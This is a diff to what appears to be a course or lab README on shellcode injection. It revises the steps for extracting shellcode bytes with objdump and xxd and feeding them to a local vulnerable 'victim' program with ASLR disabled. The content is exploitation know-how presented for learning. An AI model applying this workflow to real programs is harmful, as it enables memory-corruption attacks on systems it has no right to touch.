@@ -11,18 +11,16 @@ Steps
 " gcc shell.c -o shell "
 (2) Find the start and end of shellcode in shell:
 " objdump -d shell | sed -n '/shell_start/,/shell_end/p' "
-In my code, shell_begin is 0x3de, shell_end is 0x3f8
+In my code, shell_start is 0x3de, shell_end is 0x3e6
 (3) Find length of expected shellcode:
-" echo $((0x3f8-0x3de)) "
-The length is 26 and we will choose 32 which is the multiple of 8.
-(4) Round the shellcode length to 32 (next multiple of 8) and use xxd to convert the binary to char:
-" xxd -s0x3de -l32 -p shell shellcode " 
+" echo $((0x3e6-0x3de)) "
+(4) Use xxd to convert the binary to char (length exactly 8 bytes):
+" xxd -s0x3de -l8 -p shell shellcode " 
 (5) Compile the run program (make it executable via "chmod 755 cmpshell.sh")
 " ./cmpshell.sh "
-(6)  Attack our vulnerable program (also disable ASLR)
+(6)  Attack our vulnerable program (also disable ASLR)-- result: the current process is terminated
 " ((cat shellcode | xxd -r -p) ; cat) | setarch `arch` -R ./victim "
-(7) Check the return value of the victim program with "echo $?"
-The return value is 20 in the shellcode.
+
 
 Note:
 1. shellcode should not contain any NULL.
